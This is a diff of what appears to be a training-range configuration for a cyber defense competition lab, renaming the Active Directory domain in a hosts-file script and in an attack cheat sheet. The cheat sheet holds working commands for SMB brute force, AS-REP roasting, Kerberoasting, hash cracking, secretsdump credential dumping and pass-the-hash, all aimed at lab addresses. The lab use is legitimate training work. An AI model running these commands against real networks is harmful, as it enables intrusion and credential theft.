@@ -151,15 +151,15 @@
       FTP01="10.{{ range_id }}.10.9"
       
       # Domain info
-      DOMAIN="wcc.local"
-      DOMAIN_USER="administrator@wcc.local"
+      DOMAIN="ludus.domain"
+      DOMAIN_USER="domainadmin@ludus.domain"
       
       # Add to /etc/hosts
-      echo "$DC01 dc01.wcc.local dc01" >> /etc/hosts
-      echo "$FS01 fs01.wcc.local fs01" >> /etc/hosts
-      echo "$WEB01 web01.wcc.local web01" >> /etc/hosts
-      echo "$MAIL01 mail01.wcc.local mail01" >> /etc/hosts
-      echo "$DB01 db01.wcc.local db01" >> /etc/hosts
+      echo "$DC01 dc01.ludus.domain dc01" >> /etc/hosts
+      echo "$FS01 fs01.ludus.domain fs01" >> /etc/hosts
+      echo "$WEB01 web01.ludus.domain web01" >> /etc/hosts
+      echo "$MAIL01 mail01.ludus.domain mail01" >> /etc/hosts
+      echo "$DB01 db01.ludus.domain db01" >> /etc/hosts
     dest: /root/ccdc/range-config.sh
     mode: '0755'
 
@@ -238,7 +238,7 @@
       hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://10.{{ range_id }}.10.2
       
       # AS-REP Roasting (no auth needed)
-      impacket-GetNPUsers wcc.local/ -dc-ip 10.{{ range_id }}.10.2 -usersfile users.txt
+      impacket-GetNPUsers ludus.domain/ -dc-ip 10.{{ range_id }}.10.2 -usersfile users.txt
       ```
       
       ## Persistence & Lateral Movement
@@ -246,7 +246,7 @@
       ### 4. Kerberoasting
       ```bash
       # Get service tickets
-      impacket-GetUserSPNs wcc.local/user:password -dc-ip 10.{{ range_id }}.10.2 -request
+      impacket-GetUserSPNs ludus.domain/user:password -dc-ip 10.{{ range_id }}.10.2 -request
       
       # Crack tickets offline
       hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
@@ -276,7 +276,7 @@
       ### 7. Post-Exploitation
       ```bash
       # Dump credentials with secretsdump
-      impacket-secretsdump wcc.local/administrator:password@10.{{ range_id }}.10.2
+      impacket-secretsdump ludus.domain/administrator:password@10.{{ range_id }}.10.2
       
       # Pass-the-Hash
       crackmapexec smb 10.{{ range_id }}.10.0/24 -u Administrator -H <hash>
